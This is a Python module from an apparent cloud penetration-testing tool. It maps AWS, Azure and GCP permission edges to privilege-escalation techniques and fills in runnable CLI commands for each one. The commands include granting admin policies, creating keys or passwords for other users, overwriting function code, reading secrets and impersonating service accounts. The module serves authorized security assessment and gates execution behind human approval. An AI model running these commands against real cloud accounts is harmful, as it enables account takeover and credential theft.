"""Ground each abusable cloud edge in a concrete abuse technique + command.

The cloud parallel to ``adgraph/techniques.py``. For an edge like
``ci-deployer --AttachRolePolicy--> break-glass-admin`` the UI needs to show WHAT the edge lets
you do and the command that does it. Same grounded/ai_suggested treatment as the AD map:

  * a static catalog gives every edge kind a title, a one-line abuse summary, the tool, KB search
    seeds (into the 534-entry ``hacktricks-cloud`` corpus), and a correct fallback command
    template (general knowledge);
  * :func:`technique_for_edge` runs the KB search: a real KB entry supplies the command and the
    edge is ``grounded=True`` (cites the entry_id); otherwise the fallback template is used and
    the step is ``ai_suggested=True``.

Concrete endpoints (the principal/role names, the account, the function/secret) are substituted so
what the operator sees is runnable against THIS pair — but it still only runs through the gated
executor, approve-each, in engagement mode. Nothing here executes anything.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Callable

from .schema import Edge, Graph

# grounder(seeds) -> {"id", "title", "commands": [{lang, cmd}]} | None. Supplied by main.py
# (wired to the KB search). Injected callable => no import cycle with the KB/app layer.
Grounder = Callable[[str], "dict | None"]


@dataclass(frozen=True)
class AbuseSpec:
    title: str
    summary: str                 # one line: what this edge lets you do
    tool: str                    # the primary tool (aws/az/gcloud/pacu)
    kb_seeds: str                # KB search terms to find a grounded entry
    template: str                # fallback command (general knowledge), with {placeholders}
    destructive: bool = False    # a real, high-impact change on the account (UI marks it red)
    # This edge is RIGHTS YOU ALREADY HOLD, not an action — there is nothing to run, and the
    # template is a prose note. Such an edge must never acquire a command, INCLUDING from the KB
    # grounder (see :func:`technique_for_edge`).
    no_command: bool = False


# The catalog, keyed by edge kind. Commands are CLI one-liners the operator would approve.
_CATALOG: dict[str, AbuseSpec] = {
    "MemberOf": AbuseSpec(
        title="Group membership",
        summary="You already inherit {target}'s policies — no action needed; use them.",
        tool="(none)",
        kb_seeds="aws iam group membership inherited permissions privilege",
        template="# {source} is a member of {target} — its policies are already yours.",
        no_command=True,
    ),
    "AssumeRole": AbuseSpec(
        title="Assume a more-privileged role",
        summary="Assume {target} with STS and take on its permissions.",
        tool="aws sts",
        kb_seeds="aws sts assume-role privilege escalation cross account role",
        template="aws sts assume-role --role-arn {target} --role-session-name hackpit",
    ),
    "AddUserToGroup": AbuseSpec(
        title="Add yourself to a group",
        summary="Add {source_name} to {target_name}, inheriting its (admin) policies.",
        tool="aws iam",
        kb_seeds="aws iam AddUserToGroup privilege escalation add user group",
        template="aws iam add-user-to-group --group-name {target_name} --user-name {source_name}",
        destructive=True,
    ),
    "AttachUserPolicy": AbuseSpec(
        title="Attach an admin policy to a user",
        summary="Attach AdministratorAccess to {target_name} (iam:AttachUserPolicy).",
        tool="aws iam",
        kb_seeds="aws iam AttachUserPolicy administratoraccess privilege escalation",
        template=("aws iam attach-user-policy --user-name {target_name} "
                  "--policy-arn arn:aws:iam::aws:policy/AdministratorAccess"),
        destructive=True,
    ),
    "AttachRolePolicy": AbuseSpec(
        title="Attach an admin policy to a role",
        summary="Attach AdministratorAccess to {target_name} (iam:AttachRolePolicy), then use it.",
        tool="aws iam",
        kb_seeds="aws iam AttachRolePolicy administratoraccess privilege escalation role",
        template=("aws iam attach-role-policy --role-name {target_name} "
                  "--policy-arn arn:aws:iam::aws:policy/AdministratorAccess"),
        destructive=True,
    ),
    "AttachGroupPolicy": AbuseSpec(
        title="Attach an admin policy to a group",
        summary="Attach AdministratorAccess to {target_name} (iam:AttachGroupPolicy).",
        tool="aws iam",
        kb_seeds="aws iam AttachGroupPolicy administratoraccess privilege escalation group",
        template=("aws iam attach-group-policy --group-name {target_name} "
                  "--policy-arn arn:aws:iam::aws:policy/AdministratorAccess"),
        destructive=True,
    ),
    "PutUserPolicy": AbuseSpec(
        title="Inline an allow-* policy on a user",
        summary="Write an inline allow-*:* policy onto {target_name} (iam:PutUserPolicy).",
        tool="aws iam",
        kb_seeds="aws iam PutUserPolicy inline policy privilege escalation",
        template=("aws iam put-user-policy --user-name {target_name} --policy-name esc "
                  "--policy-document '{\"Version\":\"2012-10-17\",\"Statement\":"
                  "[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"),
        destructive=True,
    ),
    "PutRolePolicy": AbuseSpec(
        title="Inline an allow-* policy on a role",
        summary="Write an inline allow-*:* policy onto {target_name} (iam:PutRolePolicy).",
        tool="aws iam",
        kb_seeds="aws iam PutRolePolicy inline policy role privilege escalation",
        template=("aws iam put-role-policy --role-name {target_name} --policy-name esc "
                  "--policy-document '{\"Version\":\"2012-10-17\",\"Statement\":"
                  "[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"),
        destructive=True,
    ),
    "CreatePolicyVersion": AbuseSpec(
        title="Rewrite a managed policy",
        summary="Create a new default version of {target_name} granting *:* (iam:CreatePolicyVersion).",
        tool="aws iam",
        kb_seeds="aws iam CreatePolicyVersion set default privilege escalation policy",
        template=("aws iam create-policy-version --policy-arn {target} "
                  "--policy-document file://admin.json --set-as-default"),
        destructive=True,
    ),
    "SetDefaultPolicyVersion": AbuseSpec(
        title="Roll a policy to an admin version",
        summary="Set {target_name}'s default to an older, more-permissive version.",
        tool="aws iam",
        kb_seeds="aws iam SetDefaultPolicyVersion rollback privilege escalation",
        template="aws iam set-default-policy-version --policy-arn {target} --version-id v1",
        destructive=True,
    ),
    "UpdateAssumeRolePolicy": AbuseSpec(
        title="Rewrite a role's trust policy",
        summary="Let yourself assume {target_name} by rewriting its trust policy.",
        tool="aws iam",
        kb_seeds="aws iam UpdateAssumeRolePolicy trust policy assume privilege escalation",
        template=("aws iam update-assume-role-policy --role-name {target_name} "
                  "--policy-document file://trust.json"),
        destructive=True,
    ),
    "CreateAccessKey": AbuseSpec(
        title="Mint access keys as another user",
        summary="Create long-lived access keys for {target_name} (iam:CreateAccessKey).",
        tool="aws iam",
        kb_seeds="aws iam CreateAccessKey privilege escalation access key another user",
        template="aws iam create-access-key --user-name {target_name}",
        destructive=True,
    ),
    "CreateLoginProfile": AbuseSpec(
        title="Set a console password on a user",
        summary="Create/overwrite {target_name}'s console login profile (iam:CreateLoginProfile).",
        tool="aws iam",
        kb_seeds="aws iam CreateLoginProfile UpdateLoginProfile console password privilege escalation",
        template=("aws iam create-login-profile --user-name {target_name} "
                  "--password 'Hackpit#Pw1' --no-password-reset-required"),
        destructive=True,
    ),
    "PassRole": AbuseSpec(
        title="Pass a role to a service you control",
        summary="Pass {target_name} to a compute service (iam:PassRole) and run code as it.",
        tool="aws iam / aws lambda",
        kb_seeds="aws iam PassRole lambda ec2 privilege escalation pass role",
        template=("aws lambda create-function --function-name esc --role {target} "
                  "--runtime python3.12 --handler i.h --zip-file fileb://f.zip"),
        destructive=True,
    ),
    "UpdateFunctionCode": AbuseSpec(
        title="Overwrite a Lambda's code",
        summary="Replace {function_name}'s code to run as its role {target_name}.",
        tool="aws lambda",
        kb_seeds="aws lambda UpdateFunctionCode execution role privilege escalation",
        template="aws lambda update-function-code --function-name {function_name} --zip-file fileb://payload.zip",
        destructive=True,
    ),
    "CreateFunction": AbuseSpec(
        title="Create a Lambda that runs as a role",
        summary="Create a function with {target_name} as its execution role, then invoke it.",
        tool="aws lambda",
        kb_seeds="aws lambda CreateFunction PassRole execution role privilege escalation",
        template=("aws lambda create-function --function-name esc --role {target} "
                  "--runtime python3.12 --handler i.h --zip-file fileb://f.zip"),
        destructive=True,
    ),
    "RunInstances": AbuseSpec(
        title="Launch an instance with a role",
        summary="Launch EC2 with {target_name} as its instance profile and read its creds.",
        tool="aws ec2",
        kb_seeds="aws ec2 RunInstances instance profile PassRole privilege escalation",
        template=("aws ec2 run-instances --image-id ami-0 --instance-type t3.micro "
                  "--iam-instance-profile Name={target_name} --user-data file://cmd.sh"),
        destructive=True,
    ),
    "ReadSecret": AbuseSpec(
        title="Read a secret",
        summary="Read {target_name} — it may hold credentials that escalate further.",
        tool="aws secretsmanager / ssm",
        kb_seeds="aws secretsmanager get-secret-value ssm parameter credentials loot",
        template="aws secretsmanager get-secret-value --secret-id {target}",
    ),
    "DecryptKey": AbuseSpec(
        title="Decrypt with a KMS key",
        summary="Use {target_name} to decrypt a stored ciphertext / data key.",
        tool="aws kms",
        kb_seeds="aws kms decrypt data key ciphertext privilege escalation",
        template="aws kms decrypt --key-id {target} --ciphertext-blob fileb://blob.bin",
    ),
    # --- Azure -------------------------------------------------------------- #
    "OwnerOnSelf": AbuseSpec(
        title="Grant yourself Owner",
        summary="Assign {source_name} the Owner role on {target_name} (roleAssignments/write).",
        tool="az role",
        kb_seeds="azure role assignment write owner privilege escalation self",
        template="az role assignment create --assignee {source_name} --role Owner --scope {target}",
        destructive=True,
    ),
    "AddAppCredential": AbuseSpec(
        title="Add credentials to an app registration",
        summary="Add a client secret to {target_name}'s app and authenticate as its service principal.",
        tool="az ad",
        kb_seeds="azure ad application add password credential service principal privilege escalation",
        template="az ad app credential reset --id {target_name} --append",
        destructive=True,
    ),
    "RunCommandVM": AbuseSpec(
        title="Run a command on a VM",
        summary="Run a script on {target_name} as its managed identity (Compute runCommand).",
        tool="az vm",
        kb_seeds="azure vm run-command managed identity privilege escalation",
        template=("az vm run-command invoke -g <rg> -n {target_name} "
                  "--command-id RunShellScript --scripts 'id'"),
        destructive=True,
    ),
    "AKSAdminCreds": AbuseSpec(
        title="Get AKS cluster-admin",
        summary="Pull the cluster-admin kubeconfig for {target_name} (listClusterAdminCredential).",
        tool="az aks",
        kb_seeds="azure aks listClusterAdminCredential cluster admin kubeconfig privilege escalation",
        template="az aks get-credentials --admin -g <rg> -n {target_name}",
        destructive=True,
    ),
    # --- GCP ---------------------------------------------------------------- #
    "ServiceAccountTokenCreator": AbuseSpec(
        title="Impersonate a service account",
        summary="Mint an access token for {target_name} (iam.serviceAccounts.getAccessToken).",
        tool="gcloud",
        kb_seeds="gcp service account impersonation getAccessToken token creator privilege escalation",
        template="gcloud auth print-access-token --impersonate-service-account={target_name}",
    ),
    "ActAs": AbuseSpec(
        title="Deploy as a service account (actAs)",
        summary="Deploy a resource running as {target_name} (iam.serviceAccounts.actAs).",
        tool="gcloud",
        kb_seeds="gcp iam.serviceAccounts.actAs deploy privilege escalation service account",
        template=("gcloud functions deploy esc --runtime python312 --trigger-http "
                  "--service-account {target_name} --source ."),
        destructive=True,
    ),
    "SetIamPolicy": AbuseSpec(
        title="Grant yourself a role (setIamPolicy)",
        summary="Bind {source_name} to a privileged role on {target_name} (setIamPolicy).",
        tool="gcloud",
        kb_seeds="gcp setIamPolicy add-iam-policy-binding owner privilege escalation",
        template=("gcloud projects add-iam-policy-binding {account} "
                  "--member=user:{source_name} --role=roles/owner"),
        destructive=True,
    ),
    "DeployFunctionAs": AbuseSpec(
        title="Deploy a function as a service account",
        summary="Deploy a Cloud Function running as {target_name}, then invoke it.",
        tool="gcloud",
        kb_seeds="gcp cloud functions deploy service-account privilege escalation actAs",
        template=("gcloud functions deploy esc --runtime python312 --trigger-http "
                  "--service-account {target_name} --source ."),
        destructive=True,
    ),
}


def _name(label: str) -> str:
    """A bare resource name from an ARN / label (the last path or ``:`` segment)."""
    if not label:
        return ""
    tail = label.rsplit(":", 1)[-1]
    return tail.rsplit("/", 1)[-1] or label


def _fill(template: str, ctx: dict[str, str]) -> str:
    out = template
    for k, v in ctx.items():
        out = out.replace("{" + k + "}", v)
    return out


def _cli_key(cmd: str) -> str:
    """The first runnable line's leading CLI tokens (e.g. ``aws iam attach-role-policy``), lowered.
    Used to check that a KB-grounded command is the SAME abuse as this edge, not merely a cloud
    command retrieved by the same seed terms."""
    line = next((ln.strip() for ln in (cmd or "").splitlines()
                 if ln.strip() and not ln.strip().startswith("#")), "")
    toks = line.split()
    if toks:
        toks[0] = toks[0].rsplit("/", 1)[-1]
    return " ".join(toks[:3]).lower()


def technique_for_edge(
    edge: Edge | dict, graph: Graph, grounder: Grounder | None = None, account: str | None = None
) -> dict[str, Any]:
    """Resolve the abuse technique + command for one edge.

    ``grounder`` (optional) maps the technique's KB seeds to a matching KB entry's commands. Returns
    ``{kind, title, summary, tool, destructive, grounded, ai_suggested, entry_id, entry_title,
    commands: [{lang, cmd}], why}``. ``grounded`` is True with an ``entry_id`` when the KB supplied
    the command; otherwise the catalog template is used and ``ai_suggested`` is True. Never executes
    anything — this is display + a command the human may later approve through the gated executor.
    """
    if isinstance(edge, dict):
        source, target, kind = edge["source"], edge["target"], edge["kind"]
        eprops = edge.get("props") or {}
    else:
        source, target, kind = edge.source, edge.target, edge.kind
        eprops = edge.props

    tnode = graph.node(target)
    snode = graph.node(source)
    spec = _CATALOG.get(kind)
    if spec is None:
        return {
            "kind": kind, "title": kind, "summary": "(no abuse mapped for this edge)",
            "tool": "", "destructive": False, "grounded": False, "ai_suggested": True,
            "entry_id": None, "entry_title": None, "commands": [], "why": "",
        }

    fn_arn = str(eprops.get("via_function") or "")
    ctx = {
        "source": snode.label if snode else source,
        "target": tnode.label if tnode else target,
        "source_name": _name(snode.label if snode else source),
        "target_name": _name(tnode.label if tnode else target),
        "account": str(account or graph.account or "<account>"),
        "provider": graph.provider or "aws",
        "permission": str(eprops.get("permission") or ""),
        "function": fn_arn,
        "function_name": _name(fn_arn) or (tnode.props.get("name") if tnode else "") or "<function>",
    }

    summary = _fill(spec.summary, ctx)
    commands: list[dict[str, Any]] = []
    grounded = False
    entry_id = entry_title = None
    why = ""

    # Try to ground the command in the KB. Two guards keep cloud grounding honest — the cloud
    # corpus is prose/reference-heavy, so a seed-term match does not mean the retrieved command is
    # THIS abuse:
    #   * a ``no_command`` edge (MemberOf) takes the CITATION but NOT the command — inherited rights
    #     are not something you run (mirrors adgraph's fix);
    #   * an actionable edge adopts a grounded command ONLY when its CLI action matches the edge's
    #     own (``aws iam attach-role-policy`` == ``aws iam attach-role-policy``). A cloud command
    #     retrieved by the same seed terms but doing something else would be WORSE than the precise
    #     catalog template — so when it does not match we keep the catalog command and still cite the
    #     KB entry as the explanation. Enrich, never mis-grounds.
    tmpl_key = _cli_key(_fill(spec.template, ctx))
    if grounder is not None:
        try:
            hit = grounder(spec.kb_seeds)
        except Exception:
            hit = None
        if hit and hit.get("commands"):
            entry_id = hit.get("id")
            entry_title = hit.get("title")
            grounded = True
            why = f"Grounded in KB technique “{entry_title}”."
            if spec.no_command:
                why += (" Rights you already hold — the KB entry explains the edge; there is "
                        "nothing to run, so no command is offered.")
            else:
                for c in hit["commands"][:3]:
                    if _cli_key(c.get("cmd", "")) == tmpl_key:
                        commands.append({"lang": c.get("lang") or "bash", "cmd": c.get("cmd") or ""})
                if not commands:
                    why += " Command from the precise catalog (the KB entry explains it)."

    if not commands and not spec.no_command:  # fallback: the catalog template (precise CLI)
        commands = [{"lang": "bash", "cmd": _fill(spec.template, ctx)}]
        why = why or "General-knowledge technique (no exact KB entry matched)."
    elif not commands and spec.no_command:  # prose note (inherited rights)
        commands = [{"lang": "bash", "cmd": _fill(spec.template, ctx)}]
        why = why or "Rights you already hold — nothing to run."

    return {
        "kind": kind,
        "title": spec.title,
        "summary": summary,
        "tool": spec.tool,
        "destructive": spec.destructive,
        "grounded": grounded,
        "ai_suggested": not grounded,
        "entry_id": entry_id,
        "entry_title": entry_title,
        "commands": commands,
        "why": why,
    }


__all__ = ["AbuseSpec", "Grounder", "technique_for_edge"]
